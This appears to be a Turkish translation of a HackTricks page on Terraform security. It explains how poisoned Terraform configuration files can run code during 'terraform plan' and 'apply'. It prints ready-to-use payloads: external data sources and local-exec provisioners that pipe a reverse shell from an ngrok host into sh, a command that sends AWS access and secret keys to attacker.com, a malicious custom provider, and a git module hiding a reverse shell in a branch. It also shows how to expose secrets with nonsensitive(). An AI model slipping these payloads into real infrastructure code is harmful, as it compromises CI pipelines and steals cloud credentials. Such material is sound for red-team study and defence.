# Terraform Güvenliği

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Temel Bilgiler

[Dökümantasyondan: ](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform, **insan tarafından okunabilir yapılandırma dosyalarında** bulut ve yerinde kaynakları tanımlamanıza, sürümlemenize, yeniden kullanmanıza ve paylaşmanıza olanak tanıyan bir **altyapı kodu aracıdır**. Ardından, altyapınızın yaşam döngüsü boyunca tutarlı bir iş akışı kullanarak tüm altyapınızı oluşturmayı ve yönetmeyi sağlayabilirsiniz. Terraform, hesaplama, depolama ve ağ kaynakları gibi düşük seviye bileşenleri, DNS girişleri ve SaaS özellikleri gibi yüksek seviye bileşenleri yönetebilir.

### Terraform nasıl çalışır?

Terraform, bulut platformlarında ve diğer hizmetlerde kaynakları ve hizmetleri uygulama programlama arayüzleri (API'ler) aracılığıyla oluşturur ve yönetir. Sağlananlar, Terraform'un erişilebilir bir API'ye sahip neredeyse herhangi bir platform veya hizmetle çalışmasını sağlar.

![](<../.gitbook/assets/image (33).png>)

HashiCorp ve Terraform topluluğu, **1700'den fazla sağlayıcı** yazmıştır ve binlerce farklı türde kaynak ve hizmeti yönetmek için bu sayı sürekli olarak artmaktadır. Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog ve daha birçok sağlayıcıyı içeren tüm genel olarak kullanılabilir sağlayıcıları [Terraform Kayıt Defteri](https://registry.terraform.io/)nde bulabilirsiniz.

Temel Terraform iş akışı üç aşamadan oluşur:

* **Yazma:** Birden fazla bulut sağlayıcı ve hizmet üzerinde olabilecek kaynakları tanımlarsınız. Örneğin, bir uygulamayı sanal makinelerde bir Sanal Özel Ağ (VPC) ağındaki güvenlik grupları ve bir yük dengeleyici ile dağıtmak için bir yapılandırma oluşturabilirsiniz.
* **Planlama:** Terraform, mevcut altyapı ve yapılandırmanıza dayanarak oluşturacağı, güncelleyeceği veya yok edeceği altyapıyı tanımlayan bir yürütme planı oluşturur.
* **Uygulama:** Onaylandığında, Terraform önerilen işlemleri doğru sırayla gerçekleştirir ve herhangi bir kaynak bağımlılığını dikkate alır. Örneğin, bir VPC'nin özelliklerini güncellerseniz ve bu VPC'deki sanal makine sayısını değiştirirseniz, Terraform, sanal makineleri ölçeklendirmeden önce VPC'yi yeniden oluşturur.

![](<../.gitbook/assets/image (81).png>)

## Terraform Laboratuvarı

Sadece bilgisayarınıza terraform kurun.

İşte [kılavuz](https://learn.hashicorp.com/tutorials/terraform/install-cli) ve burada [terraform'ı indirmenin en iyi yolu](https://www.terraform.io/downloads) bulunmaktadır.

## Terraform'da Uzaktan Kod Çalıştırma (RCE)

Terraform'un **bir web sayfası veya ağ hizmeti sunan bir platformu yoktur** bu yüzden sayılabilecek bir şey yoktur, bu nedenle terraform'ı **etkileyebilmek için terraform yapılandırma dosyalarını eklemek/değiştirmek** gerekmektedir.

Ancak, terraform, düzgün çalışabilmesi için farklı konumlara **özel erişim** sağlayacağından, terraform'ın **çok hassas bir bileşen** olduğunu unutmamak önemlidir.

Bir saldırganın terraform'ın çalıştığı sistemi etkileyebilmesi için **terraform yapılandırma dosyalarını depolayan depoyu etkilemesi** en yaygın yol olacaktır, çünkü bir noktada bu dosyalar **yorumlanacak**tır.

Aslında, **Atlantis** gibi bir PR oluşturulduktan sonra otomatik olarak `terraform plan/apply` komutlarını çalıştıran çözümler bulunmaktadır:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Bir terraform dosyasını etkileyebiliyorsanız, birisi `terraform plan` veya `terraform apply` komutunu çalıştırdığında RCE gerçekleştirmek için farklı yöntemler bulunmaktadır.

### Terraform plan

Terraform plan, terraform'da **en çok kullanılan komuttur** ve geliştiriciler/terraform kullanan çözümler bunu sürekli çağırır, bu yüzden RCE elde etmenin **en kolay yolu**, bir terraform yapılandırma dosyasını zehirlemek ve `terraform plan` komutunda keyfi komutlar çalıştırmaktır.

#### Harici bir sağlayıcı kullanma

Terraform, Terraform ve harici programlar arasında bir arayüz sağlayan [`external` sağlayıcıyı](https://registry.terraform.io/providers/hashicorp/external/latest/docs) sunar. Bir `plan` sırasında keyfi kod çalıştırmak için `external` veri kaynağını kullanabilirsiniz.

Aşağıdaki gibi bir terraform yapılandırma dosyasına enjekte edilen şey, `terraform plan` komutu çalıştırıldığında bir ters kabuk çalıştıracaktır:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Özel bir sağlayıcı kullanma

Bir saldırgan, [özel bir sağlayıcıyı](https://learn.hashicorp.com/tutorials/terraform/provider-setup) [Terraform Kayıt Defteri'ne](https://registry.terraform.io/) gönderebilir ve ardından bunu Terraform koduna bir özellik dalında ekleyebilir ([buradan örnek](https://alex.kaskaso.li/post/terraform-plan-rce)).
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Sağlayıcı `init` sırasında indirilir ve `plan` çalıştırıldığında kötü amaçlı kodu çalıştırır

Bir örneği [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) adresinde bulabilirsiniz.

#### Harici bir referans kullanma

Bahsedilen her iki seçenek de kullanışlıdır, ancak çok gizli değildir (ikincisi birincisinden daha gizli, ancak daha karmaşıktır). Bu saldırıyı daha **gizli bir şekilde** gerçekleştirebilirsiniz, aşağıdaki önerilere uyarak:

* Terraform dosyasına doğrudan rev shell eklemek yerine, rev shell içeren bir **harici kaynağı yükleyebilirsiniz**:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Rev shell kodunu [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) adresinde bulabilirsiniz.

* Dış kaynakta, **terraform rev shell kodunu bir dal içinde** gizlemek için **ref** özelliğini kullanın, örneğin: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Tüm değişiklikleri uygulamak için Terraform apply komutu kullanılır, aynı zamanda **yerel yürütme** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)** ile** **kötü niyetli bir Terraform dosyası enjekte ederek RCE elde etmek için de kullanılabilir**.\
Sadece aşağıdaki gibi bir payload'ın `main.tf` dosyasında yer aldığından emin olmanız gerekmektedir:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
## Sızıntılar

Terraform dosyasına aşağıdaki gibi bir şey ekleyerek, `terraform apply` komutunu çalıştırarak Terraform tarafından kullanılan gizli değerleri sızdırabilirsiniz:

```hcl
data "external" "secrets" {
  program = ["sh", "-c", "echo 'secretpassword'"]
}

output "secrets" {
  value = data.external.secrets.result
}
```

Bu örnekte, `secretpassword` adlı bir gizli değer dışa aktarılıyor. Bu değeri gerçek bir gizli değerle değiştirmeniz gerekmektedir.
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Denetim Araçları

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec, terraform kodunuzun statik analizini kullanarak potansiyel yanlış yapılandırmaları tespit eder.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan, Altyapı olarak Kod için bir statik kod analiz aracıdır.

## Referanslar

* [Atlantis Güvenliği](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek paylaşın.

</details>
